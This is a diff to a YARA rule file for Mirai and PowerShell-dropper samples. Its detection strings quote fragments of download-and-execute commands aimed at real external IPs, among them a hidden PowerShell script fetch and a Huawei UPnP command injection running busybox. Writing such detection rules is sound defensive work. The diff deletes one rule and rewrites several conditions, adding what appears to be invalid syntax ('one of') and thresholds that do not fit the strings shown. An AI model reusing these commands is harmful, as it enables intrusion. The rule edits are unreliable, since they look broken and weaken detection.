@@ -33531,13 +33531,12 @@ rule fe06905f78cd76a3735654f08b313d7ad07c5cbf7e73d91a1200f10db299a849_fe06905f {
       hash1 = "fe06905f78cd76a3735654f08b313d7ad07c5cbf7e73d91a1200f10db299a849"
    strings:
       $x1 = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://144.31.2" ascii /* score: '63.00'*/
-      $x2 = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://144.31.2" ascii /* score: '59.00'*/
       $s3 = "1.122:8888/lol111' -OutFile ([IO.Path]::Combine([Environment]::GetFolderPath('ApplicationData'), 'script.ps1')); & ([IO.Path]::C" ascii /* score: '22.00'*/
       $s4 = "ombine([Environment]::GetFolderPath('ApplicationData'), 'script.ps1')); Remove-Item ([IO.Path]::Combine([Environment]::GetFolder" ascii /* score: '18.00'*/
       $s5 = "Path('ApplicationData'), 'script.ps1'));\"" fullword ascii /* score: '10.00'*/
    condition:
       uint16(0) == 0x0a0d and filesize < 1KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and one of ($s*)
 }
 
 rule fe3b52ffa96a6c7474982f6a49c1ceea67f55b1dc7881e77394966d5ca03173c_fe3b52ff {
@@ -36199,28 +36198,7 @@ rule Mirai_signature__461028c5 {
       $s8 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__4863f247 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_4863f247.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-28"
-      hash1 = "4863f247ca20b21777170f1c4ab9f0e43184420ab6d752f1d749caedadc70cd5"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
-      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
-      $s5 = "killattk" fullword ascii /* score: '8.00'*/
-      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
-      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s8 = "botkill" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 3 of ($s*)
 }
 
 rule Mirai_signature__443e88e9 {
@@ -38613,7 +38591,7 @@ rule _Mirai_signature__264370b8_Mirai_signature__26f251ca_Mirai_signature__2ee9a
       $s14 = "      if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
       $s15 = "h $T&; rm -f $T; break; fi; rm -f $T; done; exec %s skidstart'" fullword ascii /* score: '23.00'*/
    condition:
-      ( uint16(0) == 0x457f and filesize < 1000KB and ( 1 of ($x*) and all of them )
+      ( uint16(0) == 0x457f and filesize < 1000KB and ( 10 of ($x*) and one of ($s*) )
       ) or ( all of them )
 }
 
@@ -38795,7 +38773,7 @@ rule _Mirai_signature__2443540b_Mirai_signature__3065e1e0_Mirai_signature__497bb
       $s12 = "$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
       $s13 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
    condition:
-      ( uint16(0) == 0x457f and filesize < 200KB and ( 1 of ($x*) and all of them )
+      ( uint16(0) == 0x457f and filesize < 200KB and ( 2 of ($x*) and 5 of ($s*) )
       ) or ( all of them )
 }
 
